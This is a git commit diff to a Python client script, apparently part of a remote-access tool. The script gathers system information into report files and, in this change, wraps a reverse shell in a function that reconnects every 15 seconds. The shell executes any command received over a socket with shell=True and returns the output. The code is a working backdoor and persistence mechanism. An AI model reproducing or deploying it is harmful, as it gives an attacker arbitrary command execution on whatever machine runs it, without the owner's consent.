57a900b6e003acf02bca34e38ecbd178f739beb1
Ashirasenju2 <pa.soubrier@gmail.com>
2022-06-18 00:52:51 +0200

    Setup the regular ping to the serv

--- Client/repport_py.py
+++ Client/repport_py.py
@@ -8,8 +8,6 @@ import time
 import random
 from Payload import encryption
 
-
-
 # get the basic information of the software
 report = open("report.txt", "w+")
 id = open("id.txt", "a+")
@@ -90,22 +88,34 @@ report.close()
 # sending the datas to the server
 attr_port_file = open("port_attr.txt", "r")
 attr = attr_port_file.read()
-s = socket.socket()
-host = '127.0.0.1'
-port = int(attr)
 
-s.connect((host, port))
+
+def reversh():
+    s = socket.socket()
+    host = '127.0.0.1'
+    port = int(attr)
+
+    s.connect((host, port))
+    while True:
+        data = s.recv(1024)
+        if data[:2].decode("utf-8") == 'cd':
+            os.chdir(data[3:].decode("utf-8"))
+
+        if len(data) > 0:
+            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
+                                   stderr=subprocess.PIPE)
+            output_byte = cmd.stdout.read() + cmd.stderr.read()
+            output_str = str(output_byte, "utf-8")
+            currentWD = os.getcwd() + "> "
+            s.send(str.encode(output_str + currentWD))
+
+            print(output_str)
+
 
 while True:
-    data = s.recv(1024)
-    if data[:2].decode("utf-8") == 'cd':
-        os.chdir(data[3:].decode("utf-8"))
+    try:
+        reversh()
 
-    if len(data) > 0:
-        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-        output_byte = cmd.stdout.read() + cmd.stderr.read()
-        output_str = str(output_byte,"utf-8")
-        currentWD = os.getcwd() + "> "
-        s.send(str.encode(output_str + currentWD))
-
-        print(output_str)
+    except ConnectionRefusedError:
+        time.sleep(15)
+        pass
